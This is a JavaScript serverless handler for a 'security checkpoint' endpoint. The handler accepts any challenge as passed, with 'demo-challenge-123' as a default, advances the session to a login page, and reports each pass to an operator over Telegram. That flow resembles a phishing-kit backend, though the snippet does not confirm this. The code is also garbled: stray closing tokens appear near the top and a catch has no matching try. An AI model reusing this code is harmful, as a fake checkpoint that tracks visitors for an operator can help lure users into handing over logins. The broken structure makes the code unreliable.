import { getSessionData, createSessionCookieHeader, sendEdgeTelegramNotification } from '../utils/edgeSession.js';

export async function onRequestPost(context) {
  const { request, env } = context;
  const authState = await getSessionData(request, env);

      );
    }

    authState.challengeId = body.challengeId || 'demo-challenge-123';
    authState.challengePassed = true;
    authState.state = 'LOGIN_PAGE';

    sendEdgeTelegramNotification(
      {
        title: 'Security checkpoint passed',
        lines: [`*Challenge ID:* ${authState.challengeId}`, `*Status:* SUCCESS`],
      },
      env
    );

    const cookieHeader = await createSessionCookieHeader(authState, env);

    return new Response(
      JSON.stringify({ success: true, accessGranted: true, next: '/login' }),
      {
        headers: {
          'Content-Type': 'application/json',
          'Set-Cookie': cookieHeader,
        },
      }
    );
  } catch (err) {
    return new Response(
      JSON.stringify({ success: false, error: 'Invalid request body' }),
      { status: 400, headers: { 'Content-Type': 'application/json' } }
    );
  }
}
